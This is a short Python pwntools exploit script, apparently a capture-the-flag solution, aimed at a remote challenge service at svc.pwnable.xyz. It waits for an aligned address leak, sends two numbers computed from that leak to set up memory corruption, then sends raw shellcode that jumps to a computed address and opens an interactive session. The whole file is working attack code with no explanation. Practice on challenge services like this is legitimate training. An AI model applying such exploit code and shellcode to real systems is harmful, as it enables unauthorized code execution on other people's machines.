from pwn import *

while(True):
        #target=process('./challenge')
        target=remote('svc.pwnable.xyz',30028)

        print(target.recvuntil("0x"))
        leak=int(target.recvline().strip("\n"),16)
        print(hex(leak))
        if(leak%0x10!=0):
                target.close()
                continue
        break

print(target.recvuntil("> "))
#sol=solve([x*(leak-x)%0x100000000-0x20])
#print(sol)
print(hex(0x10000000*(leak-0x10000000)))
target.sendline(str(leak-0x10000000)+" "+str(0x10000000))
pause()
shellcode="\x00\x02\x4C\x8B\x65\x00\x49\x81\xEC\xDA\x02\x00\x00\x41\xFF\xE4"
print(target.recvuntil(": "))
target.sendline(shellcode)
target.interactive()


target.interactive()
